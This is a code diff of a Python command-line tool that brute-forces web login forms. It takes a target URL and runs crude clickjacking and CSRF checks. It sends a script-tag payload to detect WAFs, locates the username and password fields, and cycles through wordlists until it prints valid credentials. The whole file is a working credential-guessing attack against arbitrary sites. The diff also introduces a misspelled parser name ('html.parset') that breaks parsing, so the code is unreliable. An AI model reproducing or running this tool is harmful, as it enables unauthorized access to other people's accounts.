@@ -5,14 +5,17 @@ import itertools
 import http.cookiejar as cookielib
 import sys
 from bs4 import BeautifulSoup
-import re
-from urllib.request import urlopen
-from urllib.error import URLError
+from re import search, findall
+from urllib.request import urlopen, URLError
 
-# Mechanize browser setup
-br = mechanize.Browser()
+# Stuff related to Mechanize browser module
+br = mechanize.Browser()  # Shortening the call by assigning it to a variable "br"
+
+# Set cookies
 cookies = cookielib.LWPCookieJar()
 br.set_cookiejar(cookies)
+
+# Mechanize settings
 br.set_handle_equiv(True)
 br.set_handle_redirect(True)
 br.set_handle_referer(True)
@@ -28,63 +31,60 @@ br.addheaders = [
 ]
 
 # Banner
-print('''\033[1;93m
- _   _ _____ ____  
-| \ | |_   _|  _ \ 
-|  \| | | | | | | |
-| |\  | | | | |_| |
-|_| \_| |_| |____/ 
+print('''
+\033[1;93m
+ ____  _ _____ _
+/ ___|(_)_   _| |__  _   _
+\___ \| | | | | '_ \| | | |
+ ___) | | | | | | | | |_| |
+|____/|_| |_| |_| |_|\__,_|
 \033[1;34m
 ''')
 
-url = input('\033[1;34m[?]\033[0m Enter target URL: ')
-
-# URL validation and modification
+url = input('\033[1;34m[?]\033[0m Enter target URL: ')  # Takes input from user
 if not url.startswith(('http://', 'https://')):
     url = 'http://' + url
+
 try:
-    br.open(url, timeout=10.0)
+    br.open(url, timeout=10.0)  # Opens the url
 except URLError:
     url = 'https://' + url
     br.open(url)
 
-forms = br.forms()
-headers = str(urlopen(url).headers).lower()
+forms = list(br.forms())  # Finds all the forms present on webpage
+headers = str(urlopen(url).headers).lower()  # Fetches headers of webpage
 
 if 'x-frame-options:' not in headers:
     print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
 if 'cloudflare-nginx' in headers:
     print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')
 
-data = br.open(url).read()
+data = br.open(url).read().decode('utf-8')  # Reads the response
 if 'type="hidden"' not in data:
     print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')
 
-soup = BeautifulSoup(data, 'html.parser')
-i_title = soup.find('title')
-original = i_title.contents if i_title else None
+soup = BeautifulSoup(data, 'html.parset')  # Parses the response with BeautifulSoup
+i_title = soup.find('title')  # Finds the title tag
+original = i_title.get_text() if i_title else None  # Gets value of title tag
 
-# WAF Detection
-def WAF_detector():
-    noise = "?=<script>alert()</script>"
+def WAF_detector():  # WAF detection function
+    noise = "?=<script>alert()</script>"  # A payload to provoke the WAF
     fuzz = url + noise
     try:
         res1 = urlopen(fuzz)
-        code = res1.getcode()
-        if code == 406 or code == 501:
-            print("\033[1;31m[-]\033[1;m WAF Detected: Mod_Security")
-        elif code == 999:
-            print("\033[1;31m[-]\033[1;m WAF Detected: WebKnight")
-        elif code == 419:
-            print("\033[1;31m[-]\033[1;m WAF Detected: F5 BIG IP")
-        elif code == 403:
+        if res1.code in [406, 501]:  # HTTP response codes for Mod_Security
+            print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
+        elif res1.code == 999:
+            print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
+        elif res1.code == 419:
+            print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
+        elif res1.code == 403:
             print("\033[1;31m[-]\033[1;m Unknown WAF Detected")
-    except URLError as e:
-        print(f"Error checking WAF: {e}")
+    except URLError:
+        print("Error during WAF detection.")
 
 WAF_detector()
 
-# Load wordlists
 def wordlist_u(lst):
     try:
         with open('usernames.txt', 'r') as f:
@@ -103,41 +103,37 @@ def wordlist_p(lst):
 
 usernames = []
 wordlist_u(usernames)
-print(f'\033[1;97m[>]\033[1;m Usernames loaded: {len(usernames)}')
+print('\033[1;97m[>]\033[1;m Usernames loaded:', len(usernames))
 
 passwords = []
 wordlist_p(passwords)
-print(f'\033[1;97m[>]\033[1;m Passwords loaded: {len(passwords)}')
+print('\033[1;97m[>]\033[1;m Passwords loaded:', len(passwords))
 
-# Form finding and brute force
-def find():
+def find():  # Function for finding forms
     form_number = 0
-    for f in forms:
-        data = str(f)
-        username = re.search(r'<TextControl\([^<]*=\)>', data)
+    for f in forms:  # Finds all the forms in the webpage
+        data = str(f)  # Converts the response received to string
+        username = search(r'<TextControl\([^<]*=\)>', data)  # Searches for fields that accept plain text
+
         if username:
             username = username.group().split('<TextControl(')[1][:-3]
-            print(f'\033[1;33m[!]\033[0m Username field: {username}')
-            passwd = re.search(r'<PasswordControl\([^<]*=\)>', data)
+            print('\033[1;33m[!]\033[0m Username field:', username)
+            passwd = search(r'<PasswordControl\([^<]*=\)>', data)
+
             if passwd:
                 passwd = passwd.group().split('<PasswordControl(')[1][:-3]
-                print(f'\033[1;33m[!]\033[0m Password field: {passwd}')
+                print('\033[1;33m[!]\033[0m Password field:', passwd)
                 menu, option, name = "False", "", ""
-                try:
-                    brute(username, passwd, menu, option, name, form_number)
-                except Exception as e:
-                    cannotUseBruteForce(username, e)
+                brute(username, passwd, menu, option, name, form_number)
             form_number += 1
     print('\033[1;31m[-]\033[0m No forms found')
 
-def cannotUseBruteForce(username, e):
-    print(f'\033[1;31m[!]\033[0m Cannot use brute force with user {username}. [Error: {e}]')
-
 def brute(username, passwd, menu, option, name, form_number):
     for uname in usernames:
-        print(f'\033[1;97m[>]\033[1;m Bruteforcing username: {uname}')
-        for progress, password in enumerate(passwords, start=1):
-            sys.stdout.write(f'\r\033[1;97m[>]\033[1;m Passwords tried: {progress} / {len(passwords)}')
+        progress = 1
+        print('\033[1;97m[>]\033[1;m Bruteforcing username:', uname)
+        for password in passwords:
+            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i' % (progress, len(passwords)))
             sys.stdout.flush()
             br.open(url)
             br.select_form(nr=form_number)
@@ -146,13 +142,14 @@ def brute(username, passwd, menu, option, name, form_number):
             if menu == "True":
                 br.form[name] = [option]
             resp = br.submit()
-            data = resp.read().lower()
-            if 'username or password' not in data:
+            data = resp.read().decode('utf-8')
+            if 'username or password' not in data.lower():
                 print('\n\033[1;32m[+]\033[0m Valid credentials found:')
-                print(f'\033[1;32mUsername: \033[0m{uname}')
-                print(f'\033[1;32mPassword: \033[0m{password}')
+                print('\033[1;32mUsername:\033[0m', uname)
+                print('\033[1;32mPassword:\033[0m', password)
                 sys.exit()
+            progress += 1
+        print('')
     print('\033[1;31m[-]\033[0m Failed to crack login credentials')
-    sys.exit()
 
 find()
